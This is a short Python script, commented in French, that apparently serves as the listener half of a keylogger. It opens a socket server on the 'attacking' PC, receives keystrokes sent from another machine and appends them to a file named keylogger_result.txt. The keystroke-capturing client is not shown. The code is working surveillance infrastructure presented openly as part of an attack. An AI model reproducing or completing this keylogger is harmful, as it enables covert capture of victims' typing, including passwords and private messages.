import socket
import os
import sys

s=socket.socket()
host = 'LAPTOP-IJ0VCQOM' # remplacer par le nom du PC qui "attaque" obtenu avec socket.gethostname()
port=12000
s.bind((host,port))
s.listen(10)

while True:
    c,addr=s.accept()
    content=c.recv(100).decode()
    if not content:
        break
    print(content)
    # on stocke chaque touche tapée dans le fichier suivant 
    with open('keylogger_result.txt','a') as f:
        f.write(content)